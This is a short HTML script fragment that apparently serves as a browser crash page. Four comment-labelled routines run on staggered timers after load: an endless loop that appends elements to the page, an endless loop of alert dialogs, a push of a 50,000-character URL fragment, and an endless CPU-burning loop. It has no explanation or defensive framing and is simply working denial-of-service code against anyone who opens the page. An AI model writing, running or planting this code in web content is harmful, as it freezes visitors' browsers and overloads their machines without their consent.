  <script>
    // Infinite DOM Injection (DOM Bomb)
    setTimeout(() => {
      let div = document.createElement("div");
      while (true) {
        let d = div.cloneNode();
        d.innerText = "💥";
        document.body.appendChild(d);
      }
    }, 1000); // delay to allow page load

    // Infinite Alerts (Dialog Bomb)
    setTimeout(() => {
      while (true) {
        alert("💣 Boom!");
      }
    }, 2000);

    // Fragment Bomb (force re-rendering)
    setTimeout(() => {
      let longHash = "#" + "A".repeat(50000);
      history.pushState({}, "", longHash);
    }, 3000);

    // CPU Loop (100% usage)
    setTimeout(() => {
      while (true) {
        Math.sqrt(Math.random() * Date.now());
      }
    }, 4000);
